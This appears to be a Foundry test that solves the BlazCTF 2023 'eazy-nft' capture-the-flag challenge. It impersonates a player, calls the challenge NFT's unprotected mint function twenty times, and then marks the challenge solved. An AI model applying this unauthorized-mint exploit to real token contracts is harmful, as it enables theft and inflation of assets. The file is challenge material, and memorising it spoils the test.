// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "../../lib/forge-std/src/Test.sol";
import {Vm} from "../../lib/forge-std/src/Vm.sol";
import {Challenge} from "../../src/BlazCTF2023/eazy-nft.sol";

contract ChallengeTest is Test {
    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("holesky"));
    }

    function testExploit() public {
        address playerAddress = 0xB3D6fac08D421164A414970D5225845b3A91F33F;
        Challenge challenge = new Challenge(playerAddress);

        vm.startPrank(playerAddress);

        for (uint256 i = 0; i < 20; i++) {
            challenge.et().mint(playerAddress, i);
        }
        challenge.solve();

        vm.stopPrank();

        assertTrue(challenge.isSolved());
    }
}
